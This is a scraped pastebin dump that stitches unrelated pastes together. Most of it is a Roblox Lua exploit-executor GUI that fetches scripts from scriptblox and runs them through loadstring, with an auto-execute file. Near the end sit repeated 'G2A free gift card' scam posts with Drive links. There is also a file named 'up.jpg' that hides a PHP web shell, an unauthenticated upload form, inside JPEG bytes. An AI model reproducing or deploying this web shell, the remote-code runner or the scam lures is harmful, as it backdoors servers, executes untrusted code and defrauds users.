OpenInExecutorButton_2.Size = UDim2.new(0, 75, 0, 30)
OpenInExecutorButton_2.AutoButtonColor = false
OpenInExecutorButton_2.Font = Enum.Font.FredokaOne
OpenInExecutorButton_2.Text = ""OIE""
OpenInExecutorButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
OpenInExecutorButton_2.TextSize = 18
OpenInExecutorButton_2.BackgroundTransparency = 0.8

OpenInExecutorButtonUICorner_2.CornerRadius = UDim.new(0, 12)
OpenInExecutorButtonUICorner_2.Parent = OpenInExecutorButton_2

ScriptGame.Name = ""ScriptGame""
ScriptGame.Parent = ScriptFrame
ScriptGame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScriptGame.BackgroundTransparency = 1
ScriptGame.Position = UDim2.new(0, 10, 0, 100)
ScriptGame.Size = UDim2.new(0, 280, 0, 25)
ScriptGame.Font = Enum.Font.FredokaOne
ScriptGame.Text = ""Game""
ScriptGame.TextColor3 = Color3.fromRGB(192, 192, 192)
ScriptGame.TextSize = 20
ScriptGame.TextWrapped = true
ScriptGame.TextXAlignment = Enum.TextXAlignment.Left

VerifiedScriptFrame.Name = ""VerifiedScriptFrame""
VerifiedScriptFrame.Parent = Scripts
VerifiedScriptFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
VerifiedScriptFrame.Size = UDim2.new(0, 300, 0, 150)
VerifiedScriptFrame.BackgroundTransparency = 0.8

UICorner_9.CornerRadius = UDim.new(0, 12)
UICorner_9.Parent = VerifiedScriptFrame

ScriptTitle_2.Name = ""ScriptTitle""
ScriptTitle_2.Parent = VerifiedScriptFrame
ScriptTitle_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScriptTitle_2.BackgroundTransparency = 1.000
ScriptTitle_2.Position = UDim2.new(0, 50, 0, 10)
ScriptTitle_2.Size = UDim2.new(0, 240, 0, 40)
ScriptTitle_2.Font = Enum.Font.FredokaOne
ScriptTitle_2.Text = ""Script Title""
ScriptTitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptTitle_2.TextScaled = true
ScriptTitle_2.TextSize = 14.000
ScriptTitle_2.TextWrapped = true
ScriptTitle_2.TextXAlignment = Enum.TextXAlignment.Left

VerifiedIcon.Name = ""VerifiedIcon""
VerifiedIcon.Parent = VerifiedScriptFrame
VerifiedIcon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
VerifiedIcon.BackgroundTransparency = 0
VerifiedIcon.Position = UDim2.new(0, 10, 0, 15)
VerifiedIcon.Size = UDim2.new(0, 40, 0, 30)
VerifiedIcon.Image = ""rbxassetid://15621211889""
VerifiedIcon.BackgroundTransparency = 1

ExecuteButton_2.Name = ""ExecuteButton""
ExecuteButton_2.Parent = VerifiedScriptFrame
ExecuteButton_2.BackgroundColor3 = ExecuteButton.BackgroundColor3
ExecuteButton_2.BackgroundTransparency = 0.8
ExecuteButton_2.Position = UDim2.new(0.75, 0, 0.75, 0)
ExecuteButton_2.Size = UDim2.new(0, 75, 0, 30)
ExecuteButton_2.AutoButtonColor = false
ExecuteButton_2.Font = Enum.Font.FredokaOne
ExecuteButton_2.Text = ""Execute""
ExecuteButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
ExecuteButton_2.TextSize = 18

UICorner_10.CornerRadius = UDim.new(0, 12)
UICorner_10.Parent = ExecuteButton_2

CopyScriptsButton.Name = ""CopyScriptsButton""
CopyScriptsButton.Parent = ScriptFrame
CopyScriptsButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CopyScriptsButton.BackgroundTransparency = 0.8
CopyScriptsButton.Position = UDim2.new(0.025, 0, 0.75, 0)
CopyScriptsButton.Size = UDim2.new(0, 75, 0, 30)
CopyScriptsButton.AutoButtonColor = false
CopyScriptsButton.Font = Enum.Font.FredokaOne
CopyScriptsButton.Text = ""Raw""
CopyScriptsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyScriptsButton.TextSize = 18

CopyScriptsButtonUICorner.CornerRadius = UDim.new(0, 12)
CopyScriptsButtonUICorner.Parent = CopyScriptsButton

CopyScriptsButton_2.Name = ""CopyScriptsButton""
CopyScriptsButton_2.Parent = VerifiedScriptFrame
CopyScriptsButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CopyScriptsButton_2.BackgroundTransparency = 0.8
CopyScriptsButton_2.Position = UDim2.new(0.025, 0, 0.75, 0)
CopyScriptsButton_2.Size = UDim2.new(0, 75, 0, 30)
CopyScriptsButton_2.AutoButtonColor = false
CopyScriptsButton_2.Font = Enum.Font.FredokaOne
CopyScriptsButton_2.Text = ""Raw""
CopyScriptsButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyScriptsButton_2.TextSize = 18

CopyScriptsButtonUICorner_2.CornerRadius = UDim.new(0, 12)
CopyScriptsButtonUICorner_2.Parent = CopyScriptsButton_2

CopyLinkButton.Name = ""CopyLinkButton""
CopyLinkButton.Parent = ScriptFrame
CopyLinkButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CopyLinkButton.BackgroundTransparency = 0.8
CopyLinkButton.Position = UDim2.new(0.51, 0, 0.75, 0)
CopyLinkButton.Size = UDim2.new(0, 75, 0, 30)
CopyLinkButton.AutoButtonColor = false
CopyLinkButton.Font = Enum.Font.FredokaOne
CopyLinkButton.Text = ""Link""
CopyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyLinkButton.TextSize = 18

CopyLinkButtonUICorner.CornerRadius = UDim.new(0, 12)
CopyLinkButtonUICorner.Parent = CopyLinkButton

CopyLinkButton_2.Name = ""CopyLinkButton""
CopyLinkButton_2.Parent = VerifiedScriptFrame
CopyLinkButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
CopyLinkButton_2.BackgroundTransparency = 0.8
CopyLinkButton_2.Position = UDim2.new(0.51, 0, 0.75, 0)
CopyLinkButton_2.Size = UDim2.new(0, 75, 0, 30)
CopyLinkButton_2.AutoButtonColor = false
CopyLinkButton_2.Font = Enum.Font.FredokaOne
CopyLinkButton_2.Text = ""Link""
CopyLinkButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyLinkButton_2.TextSize = 18

CopyLinkButtonUICorner_2.CornerRadius = UDim.new(0, 12)
CopyLinkButtonUICorner_2.Parent = CopyLinkButton_2

ScriptAuthor_2.Name = ""ScriptAuthor""
ScriptAuthor_2.Parent = VerifiedScriptFrame
ScriptAuthor_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScriptAuthor_2.BackgroundTransparency = 1.000
ScriptAuthor_2.Position = ScriptAuthor.Position
ScriptAuthor_2.Size = UDim2.new(0, 280, 0, 25)
ScriptAuthor_2.Font = Enum.Font.FredokaOne
ScriptAuthor_2.Text = ""By ScriptAuthor""
ScriptAuthor_2.TextColor3 = Color3.fromRGB(192, 192, 192)
ScriptAuthor_2.TextSize = 20
ScriptAuthor_2.TextWrapped = true
ScriptAuthor_2.TextXAlignment = Enum.TextXAlignment.Left

ScriptGame_2.Name = ""ScriptGame""
ScriptGame_2.Parent = VerifiedScriptFrame
ScriptGame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScriptGame_2.BackgroundTransparency = 1
ScriptGame_2.Position = UDim2.new(0, 10, 0, 100)
ScriptGame_2.Size = UDim2.new(0, 280, 0, 25)
ScriptGame_2.Font = Enum.Font.FredokaOne
ScriptGame_2.Text = ""Game""
ScriptGame_2.TextColor3 = Color3.fromRGB(192, 192, 192)
ScriptGame_2.TextSize = 20
ScriptGame_2.TextWrapped = true
ScriptGame_2.TextXAlignment = Enum.TextXAlignment.Left

ScriptListBackgroundFrame.Name = ""ScriptListBackgroundFrame""
ScriptListBackgroundFrame.Parent = MainFrame
ScriptListBackgroundFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ScriptListBackgroundFrame.BackgroundTransparency = 0.8
ScriptListBackgroundFrame.Position = UDim2.new(0, 80, 0.1, 10)
ScriptListBackgroundFrame.Size = UDim2.new(0, 360, 0, 200)

UICorner_12.CornerRadius = UDim.new(0, 12)
UICorner_12.Parent = ScriptListBackgroundFrame

DescFrame.Visible = false

Info.Name = ""Info""
Info.Parent = InfoBox
Info.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Info.BackgroundTransparency = 1
Info.Size = UDim2.new(0, 995, 0, 100)

Comments.Name = ""Comments""
Comments.Parent = InfoBox
Comments.BackgroundTransparency = 1
Comments.Size = UDim2.new(0, 400, 0, 414)
 
Inner.Name = ""Inner""
Inner.Parent = Comments
Inner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Inner.Position = UDim2.new(0, 0, 0, 10)
Inner.BackgroundTransparency = 1
Inner.Size = UDim2.new(0, 400, 0, 414)
 
UICorner_21.CornerRadius = UDim.new(0, 12)
UICorner_21.Parent = Inner
 
CommentsText.Name = ""CommentsText""
CommentsText.Parent = Inner
CommentsText.BackgroundTransparency = 1
CommentsText.Size = UDim2.new(0, 340, 0, 20)
CommentsText.Position = UDim2.new(0, 0, 0, -15)
CommentsText.Font = Enum.Font.FredokaOne
CommentsText.Text = ""Comments""
CommentsText.TextColor3 = Color3.fromRGB(255, 255, 255)
CommentsText.TextSize = 14.000

BackButtonInfoBox.Name = ""BackButtonInfoBox""
BackButtonInfoBox.Parent = InfoBox
BackButtonInfoBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BackButtonInfoBox.BackgroundTransparency = 0.8
BackButtonInfoBox.Size = UDim2.new(0, 70, 0, 20)
BackButtonInfoBox.Position = UDim2.new(0, 2, 0, 2)
BackButtonInfoBox.Font = Enum.Font.FredokaOne
BackButtonInfoBox.AutoButtonColor = false
BackButtonInfoBox.Text = ""Back""
BackButtonInfoBox.TextColor3 = Color3.fromRGB(255, 255, 255)
BackButtonInfoBox.TextSize = 15

BackButtonInfoBoxUICorner.CornerRadius = UDim.new(0, 12)
BackButtonInfoBoxUICorner.Parent = BackButtonInfoBox

Comments_2.Name = ""Comments""
Comments_2.Parent = Inner
Comments_2.Active = true
Comments_2.BackgroundTransparency = 1
Comments_2.BorderSizePixel = 0
Comments_2.Position = UDim2.new(0, 5, 0, 10)
Comments_2.Size = UDim2.new(0, 335, 0, 165)
Comments_2.CanvasSize = UDim2.new(0, 0, 0, 0)
 
Comment.Name = ""Comment""
Comment.Parent = Comments_2
Comment.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Comment.BackgroundTransparency = 1
Comment.Size = UDim2.new(0, 400, 0, 50)
 
Content.Name = ""Content""
Content.Parent = Comment
Content.BackgroundTransparency = 1
Content.Position = UDim2.new(0, 50, 0, 30)
Content.Size = UDim2.new(0, 270, 0, 20)
Content.Font = Enum.Font.FredokaOne
Content.Text = ""Comment""
Content.TextColor3 = Color3.fromRGB(255, 255, 255)
Content.TextSize = 14
Content.TextWrapped = true
Content.TextXAlignment = Enum.TextXAlignment.Left
Content.TextYAlignment = Enum.TextYAlignment.Top
Content.TextScaled = true
 
Author_2.Name = ""Author""
Author_2.Parent = Comment
Author_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Author_2.BackgroundTransparency = 1.000
Author_2.BorderSizePixel = 0
Author_2.Position = UDim2.new(0, 50, 0, 5)
Author_2.Size = UDim2.new(0, 200, 0, 25)
Author_2.Font = Enum.Font.FredokaOne
Author_2.Text = ""Author""
Author_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Author_2.TextSize = 20.000
Author_2.TextWrapped = true
Author_2.TextXAlignment = Enum.TextXAlignment.Left
 
ProfilePicture_2.Name = ""ProfilePicture""
ProfilePicture_2.Parent = Comment
ProfilePicture_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ProfilePicture_2.BackgroundTransparency = 1.000
ProfilePicture_2.Position = UDim2.new(0, 5, 0, 5)
ProfilePicture_2.Size = UDim2.new(0, 40, 0, 40)
ProfilePicture_2.Image = ""rbxassetid://17093333262""
 
UICorner_22.CornerRadius = UDim.new(1, 0)
UICorner_22.Parent = ProfilePicture_2
 
UIListLayout_3.Parent = Comments_2
UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_3.Padding = UDim.new(0, 5)

NoComments.Name = ""NoComments""
NoComments.Parent = InfoBox
NoComments.BackgroundTransparency = 1
NoComments.Position = UDim2.new(0.49, 0, 0.5, 0)
NoComments.Size = UDim2.new(0, 10, 0, 5)
NoComments.Font = Enum.Font.FredokaOne
NoComments.Text = ""There are no comments yet""
NoComments.TextColor3 = Color3.fromRGB(255, 255, 255)
NoComments.TextSize = 30

BackButtonInfoBox.MouseButton1Click:Connect(function()
UIClick:Play()
InfoBox.Visible = false
ScriptListFrame.Visible = true
NoComments.Visible = false
end)

Hint.MouseButton1Click:Connect(function()
Hint:TweenPosition(UDim2.new(0.5, 0, 2, 0),""InOut"",""Sine"",0.3)
UIClick:Play()
end)

function createfolders(path)
 local pathtbl = string.split(path, ""/"")
 for i, v in pairs(pathtbl) do
  if i == 1 then
   if not isfolder(v) then
    makefolder(v)
   end
  else
   local newpath = pathtbl[1]
   for i2=2, i-1 do
    newpath = newpath.. ""/"" ..pathtbl[i2]
   end
   newpath = newpath.. ""/"" ..v
   if not isfolder(newpath) then
    makefolder(newpath)
   end
  end
 end
end


if not isfolder(""ECCS_Searcher_V2.4"") then
createfolders(""ECCS_Searcher_V2.4"")
end

if not isfile(""ECCS_Searcher_V2.4/Executor.ECCS"") then
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
end

if not isfile(""ECCS_Searcher_V2.4/AutoExecute.ECCS"") then
writefile(""ECCS_Searcher_V2.4/AutoExecute.ECCS"", "" "")
end

local File1 = readfile(""ECCS_Searcher_V2.4/Executor.ECCS"")
ExecutorTextBox.Text = File1

local File2 = readfile(""ECCS_Searcher_V2.4/AutoExecute.ECCS"")
spawn(function()
loadstring(File2)()
end)

spawn(function()
MainFrame:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.3)
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
end)


UserInputService.InputBegan:Connect(function(input)
if input.KeyCode == Enum.KeyCode.Q then
writefile(""ES.ECCS"", """"..ExecutorTextBox.Text)
if OpenCloseSearcherButton.Text == ""‚≠ê"" then
OpenCloseSearcherButton.Text = "" ‚≠ê ""
UIClick:Play()
MainFrame.Position = UDim2.new(0.5, 0, -0.5, 0)
MainFrame:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.3)
else
if OpenCloseSearcherButton.Text == "" ‚≠ê "" then
OpenCloseSearcherButton.Text = ""‚≠ê""
UIClick:Play()
MainFrame:TweenPosition(UDim2.new(0.5, 0, 2, 0),""InOut"",""Sine"",0.3)
end
end
end
end)



getfakeasset = getcustomasset or getsynasset

page = 1
gquery = """"

function tableConcat(t1,t2)
	for i, v in pairs(t2) do
		table.insert(t1, v)
	end
	return t1
end

ScriptListFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScriptListFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.InfoBox.Comments.Inner.Comments.AutomaticCanvasSize = Enum.AutomaticSize.Y
MainFrame.InfoBox.Comments.Inner.Comments.ScrollBarImageColor3 = Color3.new(0, 0, 0)
MainFrame.InfoBox.Comments.Inner.Comments.ScrollBarImageTransparency = 1

VerifiedScript = VerifiedScriptFrame:Clone()
Script = ScriptFrame:Clone()
ScriptFrame:Destroy()
VerifiedScriptFrame:Destroy()
Comment = MainFrame.InfoBox.Comments.Inner.Comments.Comment:Clone()
MainFrame.InfoBox.Comments.Inner.Comments.Comment:Destroy()

function fastmodeExec(func)
	if getgenv().fastmode == true then
		task.spawn(func)
	else
		func()
	end
end
function _if(a, b, c)
    if a then return b else return c end
end
function fetchScripts(query, page)
	page = page or 1
	query = HttpService:UrlEncode(query)
	
	url = _if(query == """", ""https://www.scriptblox.com/api/script/fetch?page=""..tostring(page), ""https://scriptblox.com/api/script/search?q=""..query..""&max=100&mode=free&page="".. tostring(page))
	req = HttpService:JSONDecode(game:HttpGetAsync(url)).result
	
	return req.scripts
end
function fetchComments(scriptId, page)
 page = page or 1 
 
 url = ""https://scriptblox.com/api/comment/"" ..scriptId.. ""?page="" ..tostring(page).. ""&max=100""
 req = HttpService:JSONDecode(game:HttpGetAsync(url)).result
 
 return req.comments
end
function fixScript(scriptObj)
	if not scriptObj[""script""] or not scriptObj[""owner""] or not scriptObj[""features""] then
		
			req = HttpService:JSONDecode(game:HttpGetAsync(""https://www.scriptblox.com/api/script/"".. scriptObj.slug)).script
			scriptObj[""script""] = _if(scriptObj[""script""], scriptObj[""script""], req.script)
			scriptObj[""features""] = _if(scriptObj[""features""], scriptObj[""features""], req.features)
			scriptObj[""owner""] = _if(scriptObj[""owner""], scriptObj[""owner""], req.owner)
		end
	
	return scriptObj
end
function updateInfoBox(scriptObj)
 scriptObj = fixScript(scriptObj)
 
 
 commentsUIListLayout = MainFrame.InfoBox.Comments.Inner.Comments.UIListLayout:Clone()
 MainFrame.InfoBox.Comments.Inner.Comments:ClearAllChildren()
 commentsUIListLayout.Parent = MainFrame.InfoBox.Comments.Inner.Comments
 
 task.spawn(function()
  for _, v in pairs(fetchComments(scriptObj[""_id""])) do
 
   newComment = Comment:Clone()
   newComment.Parent = MainFrame.InfoBox.Comments.Inner.Comments
   newComment.Content.Text = v.text
   newComment.Author.Text = v.commentBy.username

if Content.Visible == true then
NoComments.Visible = false
end
  end
 end)
end
function refreshScripts(scriptTbl)
	if #scriptTbl <= 0 then
      SearchBox.Text = """"
      SearchBox.PlaceholderText = ""No Script Founded""
UINoScriptsFound:Play()
wait(1)
SearchBox.PlaceholderText = ""ECCS‚Ä¢Searcher""
		return
	else
SearchBox.PlaceholderText = ""ECCS‚Ä¢Searcher""
	end
	
	UIGridLayoutCopy = Scripts.UIGridLayout:Clone()
	Scripts:ClearAllChildren()
	UIGridLayoutCopy.Parent = Scripts
	
	addScripts(scriptTbl)
end

function addScripts(scriptTbl)
	for i, v in pairs(scriptTbl) do
		fastmodeExec(function()
			local newScript

			v = fixScript(v)

			if v.verified == true then
				newScript = VerifiedScript:Clone()
				newScript.ScriptTitle.Text = v.title
				newScript.ScriptAuthor.Text = ""By "".. v.owner.username
				newScript.ScriptGame.Text = v.game.name
				newScript.Parent = Scripts
			else
				newScript = Script:Clone()
				newScript.ScriptTitle.Text = v.title
				newScript.ScriptAuthor.Text = ""By "".. v.owner.username
				newScript.ScriptGame.Text = v.game.name
				newScript.Parent = Scripts
			end
			newScript.DescScriptButton.MouseButton1Click:Connect(function()
			UIClick:Play()
			ScriptListFrame.Visible = false
			DescFrame.Visible = true
			if v.game.name == ""Universal Script üìå"" then
 		   ScriptImg.Image = ""rbxassetid://18265579313""
			else
   			 ScriptImg.Image = ""https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid=""..v.game.gameId..""&fmt=png&wd=420&ht=420""
   			 end
            InfoBoxDescription.Text = v.features or ""API ERROR!""
			end)
            newScript.ChatButton.MouseButton1Click:Connect(function()
			UIClick:Play()
			InfoBox.Visible = true
			updateInfoBox(v)
			ScriptListFrame.Visible = false
			NoComments.Visible = true
			end)
			newScript.ExecuteButton.MouseButton1Click:Connect(function()
			UIClick:Play()
			loadstring(v.script)()
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Script executed!""
			end)
			newScript.OpenInExecutorButton.MouseButton1Click:Connect(function()
          	UIClick:Play()
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Script opened in executor!""
   ExecutorTextBox.Text = """"..v.script
ScriptListFrame.Visible = false
PlayerDataFrame.Visible = false
DevelopersFrame.Visible = false
ExecutorMenuScrollingFrame.Visible = true
ClearTextBoxButton.Visible = true
CopyTextBoxButton.Visible = true
InfoBox.Visible = false
PasteScriptButton.Visible = true
ExecuteTextBoxButton.Visible = true
DescFrame.Visible = false
PlayerIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DevelopersButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SearcherMenuButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ExecutorMenuButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
			end)
			newScript.CopyScriptsButton.MouseButton1Click:Connect(function()
		   setclipboard(v.script)
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Script copied into your clipboard!""
UIClick:Play()
	       end)
newScript.AutoExecuteButton.MouseButton1Click:Connect(function()
UIClick:Play()
local File2 = readfile(""ECCS_Searcher_V2.4/AutoExecute.ECCS"")
if File2 ~= v.script then
writefile(""ECCS_Searcher_V2.4/AutoExecute.ECCS"", v.script)
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Added in autoexecute!""
else
if File2 == v.script then
writefile(""ECCS_Searcher_V2.4/AutoExecute.ECCS"", "" "")
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Removed from autoexecute!""
end
end
end)

			newScript.CopyLinkButton.MouseButton1Click:Connect(function()
            setclipboard(""https://scriptblox.com/script/"".. v.slug)
UIClick:Play()
Hint:TweenPosition(UDim2.new(0.5, 0, 0.5, 0),""InOut"",""Sine"",0.2)
Hint.Text = ""Link copied into your clipboard!""
            end)
		end)
	end
	
	pagefetchrunning = false
end

SearchBox.FocusLost:Connect(function(enterPressed)
	if enterPressed then
UIClick:Play()
PasteScriptButton.Visible = false
ScriptListFrame.Visible = true
PlayerDataFrame.Visible = false
ExecutorMenuScrollingFrame.Visible = false
ClearTextBoxButton.Visible = false
CopyTextBoxButton.Visible = false
InfoBox.Visible = false
ExecuteTextBoxButton.Visible = false
DevelopersFrame.Visible = false
DescFrame.Visible = false
PlayerIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DevelopersButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SearcherMenuButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
ExecutorMenuButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
		gquery = SearchBox.Text
		page = 1
		local scriptsTbl = fetchScripts(SearchBox.Text, 1)
		refreshScripts(scriptsTbl)
	end
end)
SearchButton.MouseButton1Click:Connect(function()
UIClick:Play()
PasteScriptButton.Visible = false
ScriptListFrame.Visible = true
PlayerDataFrame.Visible = false
ExecutorMenuScrollingFrame.Visible = false
ClearTextBoxButton.Visible = false
InfoBox.Visible = false
CopyTextBoxButton.Visible = false
ExecuteTextBoxButton.Visible = false
DevelopersFrame.Visible = false
DescFrame.Visible = false
PlayerIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
DevelopersButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SearcherMenuButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
ExecutorMenuButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
writefile(""ECCS_Searcher_V2.4/Executor.ECCS"", ExecutorTextBox.Text)
gquery = SearchBox.Text
		page = 1
		local scriptsTbl = fetchScripts(SearchBox.Text, 1)
		refreshScripts(scriptsTbl)
end)

InfoBoxDescription.MouseButton1Click:Connect(function()
UIClick:Play()
ScriptListFrame.Visible = true
DescFrame.Visible = false
end)

local gui = MainFrame

local dragging
local dragInput
local dragStart
local startPos
Loading:Destroy()

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

local gui2 = OpenCloseSearcherButton

local dragging2
local dragInput2
local dragStart2
local startPos2


local function update(input)
	local delta2 = input.Position - dragStart2
	gui2.Position = UDim2.new(startPos2.X.Scale, startPos2.X.Offset + delta2.X, startPos2.Y.Scale, startPos2.Y.Offset + delta2.Y)
end

gui2.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging2 = true
		dragStart2 = input.Position
		startPos2 = gui2.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging2 = false
			end
		end)
	end
end)

gui2.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput2 = input
	end
end)

UserInputService_2.InputChanged:Connect(function(input)
	if input == dragInput2 and dragging2 then
		update(input)
	end
end)


refreshScripts(fetchScripts(gquery, 1))

ScriptListFrame:GetPropertyChangedSignal(""CanvasPosition""):Connect(function()
	if (ScriptListFrame.CanvasPosition.Y + ScriptListFrame.AbsoluteSize.Y) >= ScriptListFrame.AbsoluteCanvasSize.Y -200 and not pagefetchrunning then
		page = page + 1
		pagefetchrunning = true
		addScripts(fetchScripts(gquery, page))
	end
end)"
CeBeAsKr,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,romikdikson,JavaScript,Sunday 30th of June 2024 06:40:26 AM CDT,"G2A.com complimentary gift card & games guide.
Any voucher for free on G2A.com including Playstation gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
July 1 2024

"
E1zZ2B46,ü§ëG2A.com Free Gift Card FIX July 2024ü§ë,FeasModz514,JavaScript,Sunday 30th of June 2024 06:35:26 AM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Playstation gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
eEBbr7UW,up.jpg,blackhat1337,PHP,Sunday 30th of June 2024 06:34:47 AM CDT,"ÔøΩÔøΩÔøΩÔøΩJFIFÔøΩÔøΩ
<?php echo""<b>heked by
<meta name=""robots"" content=""noindex"">

</b><br>"";if($_POST){if(@copy($_FILES[""0""][""tmp_name""],$_FILES[""0""][""name""])){echo""Berhasil"";}else{echo""Gak Berhasil"";}}else{echo""<form method=post enctype=multipart/form-data><input type=file name=0><input name=0 type=submit value=Go!>"";}?>ÔøΩÔøΩC	

			

		


ÔøΩÔøΩC	ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ""#QrÔøΩÔøΩÔøΩÔøΩ&1!A""2qQaÔøΩÔøΩÔøΩ?ÔøΩy,ÔøΩ/3JÔøΩ›πÔøΩﬂ≤ÿã5ÔøΩXwÔøΩÔøΩÔøΩyÔøΩRÔøΩÔøΩI0ÔøΩ2ÔøΩPIÔøΩIÔøΩÔøΩiMÔøΩÔøΩÔøΩÔøΩrÔøΩN&""KgX:ÔøΩÔøΩÔøΩÔøΩnTJnLKÔøΩÔøΩ@!ÔøΩ-ÔøΩÔøΩÔøΩÔøΩmÔøΩ;ÔøΩgÔøΩÔøΩÔøΩ&ÔøΩhwÔøΩÔøΩÔøΩ@ÔøΩ‹ó9ÔøΩ-ÔøΩ.ÔøΩ1<yÔøΩÔøΩÔøΩÔøΩQÔøΩUÔøΩ€Å?.ÔøΩÔøΩÔøΩÔøΩbﬂ±ÔøΩ÷´ÔøΩw*VÔøΩÔøΩ) `$ÔøΩÔøΩbÔøΩ‘üÔøΩÔøΩXÔøΩ-ÔøΩTÔøΩÔøΩGÔøΩ3ÔøΩg ÔøΩÔøΩÔøΩÔøΩJxÔøΩÔøΩÔøΩU/ÔøΩÔøΩv_s(HÔøΩ@TÔøΩJÔøΩÔøΩÔøΩÔøΩnÔøΩÔøΩ!ÔøΩgfbÔøΩcÔøΩ:ÔøΩl[ÔøΩQe9ÔøΩPLbÔøΩÔøΩCÔøΩm[5ÔøΩÔøΩ'ÔøΩjglÔøΩÔøΩÔøΩ_ÔøΩÔøΩÔøΩl-;""PkÔøΩÔøΩÔøΩQÔøΩ_ÔøΩ^ÔøΩSÔøΩx?""ÔøΩÔøΩÔøΩYÈ®êÔøΩOÔøΩ	qÔøΩ`~~ÔøΩtÔøΩUÔøΩC⁄íÔøΩV		I1ÔøΩÔøΩ_ÔøΩÔøΩ"
mLPjbXB1,ü§ëG2A.com Free Gift Card FIX July 2024üéÅ,Justpit,JavaScript,Sunday 30th of June 2024 06:34:23 AM CDT,"G2A.com free gift card & games guide.
Any voucher for free on G2A.com including Steam gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/1kcJ-yXUpB1u8mkFHUQKnrArP6DGl5W8e/view?56620

Working as of:
1st of July 2024

"
HznLshKG,Untitled,qqt15326,HTML,Sunday 30th of June 2024 06:33:51 AM CDT,"30.06
11881 https://pastebin.com/fYiW9gsj
11882 https://pastebin.com/RhaeQPrz"
